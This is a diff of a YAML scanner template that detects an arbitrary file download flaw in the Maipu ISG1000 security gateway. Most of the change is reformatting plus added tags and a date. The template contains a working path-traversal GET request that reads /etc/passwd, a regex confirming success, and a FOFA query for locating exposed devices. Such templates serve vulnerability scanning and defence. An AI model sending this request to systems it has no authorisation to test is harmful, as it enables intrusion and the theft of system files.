@@ -1,19 +1,21 @@
 id: mpsec-isg1000-file-read
 
 info:
-    name: 迈普 ISG1000安全网关 sys_dia_data_down 任意文件下载漏洞
-    author: YekkoY
-    severity: high
-    description: |
-        迈普 ISG1000安全网关 存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件
-        title="迈普通信技术股份有限公司"
-    reference:
-        - http://wiki.peiqi.tech/wiki/iot/%E8%BF%88%E6%99%AE/%E8%BF%88%E6%99%AE%20ISG1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20sys_dia_data_down%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
+  name: 迈普 ISG1000安全网关 sys_dia_data_down 任意文件下载漏洞
+  author: YekkoY
+  severity: high
+  description: |-
+    迈普 ISG1000安全网关 存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件
+    fofa: title="迈普通信技术股份有限公司"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/%E8%BF%88%E6%99%AE/%E8%BF%88%E6%99%AE%20ISG1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20sys_dia_data_down%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
+  tags: mpsec,isg1000,file-read
+  created: 2023/07/25
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r0:
+    request:
+      method: GET
+      path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0()
